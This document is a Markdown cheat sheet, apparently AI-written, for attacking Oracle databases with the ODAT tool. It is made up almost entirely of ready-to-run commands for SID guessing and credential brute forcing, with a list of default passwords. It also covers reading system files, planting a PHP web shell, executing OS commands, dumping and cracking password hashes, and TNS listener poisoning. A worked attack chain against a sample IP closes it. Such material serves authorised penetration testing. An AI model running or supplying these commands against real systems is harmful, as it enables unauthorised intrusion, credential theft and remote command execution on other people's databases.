# ODAT

**Tags:** `#odat` `#oracle` `#database` `#enumeration` `#exploitation` `#postexploitation` `#rce`

Oracle Database Attacking Tool — automated Oracle DB exploitation from Linux. Handles the full Oracle attack chain: SID enumeration, account brute force, privilege checking, file read/write, OS command execution, and password hash extraction. Python-based, purpose-built for Oracle pentesting where sqlmap doesn't apply.

**Source:** https://github.com/quentinhardy/odat
**Install:**
```bash
# Kali — install via apt
sudo apt install odat

# Or from source
git clone https://github.com/quentinhardy/odat.git
cd odat && pip3 install -r requirements.txt
```

```bash
# Full auto-attack on a known SID
odat all -s <target-ip> -p 1521 -d <SID> -U user -P password
```

> [!note] **ODAT attack flow** — Start with `sidguesser` to find the SID, then `passwordguesser` for credentials, then `all` to run all exploit modules against confirmed creds. Use `odat` to gain the foothold, `sqlplus` for manual deep-dive once you're in.

---

## SID Enumeration

The SID (System Identifier) is required to connect to Oracle. Always enumerate before brute-forcing accounts.

```bash
# Guess SIDs using built-in wordlist
odat sidguesser -s <target-ip> -p 1521

# Specify custom SID list
odat sidguesser -s <target-ip> -p 1521 --sids-file /usr/share/metasploit-framework/data/wordlists/sid.txt

# Via Metasploit (alternative)
use auxiliary/scanner/oracle/sid_brute
```

**Common SIDs:** `ORCL`, `XE`, `DB`, `PROD`, `TEST`, `DBMS`, `HRDB`, `PAYROLL`

---

## Account Brute Force

```bash
# Brute force with default credentials list
odat passwordguesser -s <target-ip> -p 1521 -d <SID>

# Custom wordlists
odat passwordguesser -s <target-ip> -p 1521 -d <SID> \
  --accounts-file /usr/share/odat/accounts/accounts_multiple.txt

# Single account test
odat passwordguesser -s <target-ip> -p 1521 -d <SID> \
  -U scott -P tiger

# Concurrent threads (faster)
odat passwordguesser -s <target-ip> -p 1521 -d <SID> --threads 5
```

**Default Oracle credentials to try:**
| Username | Password |
|---|---|
| `sys` | `change_on_install` |
| `system` | `manager` |
| `scott` | `tiger` |
| `dbsnmp` | `dbsnmp` |
| `hr` | `hr` |
| `outln` | `outln` |

---

## Privilege Check

```bash
# Check all privileges for current user
odat privesc -s <target-ip> -p 1521 -d <SID> -U user -P password --check-privesc
```

---

## All Modules — Full Auto-Attack

```bash
# Run all attack modules against authenticated session
odat all -s <target-ip> -p 1521 -d <SID> -U user -P password

# Verbose output
odat all -s <target-ip> -p 1521 -d <SID> -U user -P password -v
```

---

## File Read

```bash
# Read a remote file (requires UTL_FILE or similar privilege)
odat utlfile -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --getFile /etc/passwd /tmp/passwd

# Read Windows file
odat utlfile -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --getFile "C:\Windows\System32\drivers\etc\hosts" /tmp/hosts
```

---

## File Write / Web Shell Upload

```bash
# Write a file to the server (requires write privileges)
odat utlfile -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --putFile /var/www/html/ shell.php shell.php

# Write a PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
odat utlfile -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --putFile /var/www/html shell.php ./shell.php

# Windows web root
odat utlfile -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --putFile "C:\inetpub\wwwroot" shell.aspx ./shell.aspx
```

---

## OS Command Execution

```bash
# Execute OS commands (requires Java or DBMS_SCHEDULER privilege)
odat externaltable -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --exec /bin/bash "id"

# Windows
odat externaltable -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --exec C:\\Windows\\System32\\cmd.exe "/c whoami"

# Java-based execution
odat java -s <target-ip> -p 1521 -d <SID> -U user -P password \
  --exec "id"
```

---

## Password Hash Extraction

```bash
# Extract Oracle password hashes (requires DBA or SELECT on sys.user$)
odat hashdump -s <target-ip> -p 1521 -d <SID> -U user -P password --dump
```

```bash
# Crack Oracle hashes — format depends on version
# Oracle 11g (SHA-1 based) — hashcat mode 112
hashcat -m 112 hashes.txt /usr/share/wordlists/rockyou.txt

# Oracle 12c (SHA-512 based) — hashcat mode 12300
hashcat -m 12300 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## TNS Listener Attacks

```bash
# Version enumeration via TNS
odat tnscmd -s <target-ip> -p 1521 --ping
odat tnscmd -s <target-ip> -p 1521 --version

# TNS poison (older Oracle versions — listener registration abuse)
odat tnspoison -s <target-ip> -p 1521 -d <SID>
```

---

## Full Attack Chain

```bash
# 1. Enumerate SID
odat sidguesser -s 192.168.1.10 -p 1521

# 2. Brute force credentials
odat passwordguesser -s 192.168.1.10 -p 1521 -d ORCL

# 3. Run all modules with found creds
odat all -s 192.168.1.10 -p 1521 -d ORCL -U scott -P tiger -v

# 4. Connect with sqlplus for manual exploitation
sqlplus scott/tiger@192.168.1.10:1521/ORCL
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
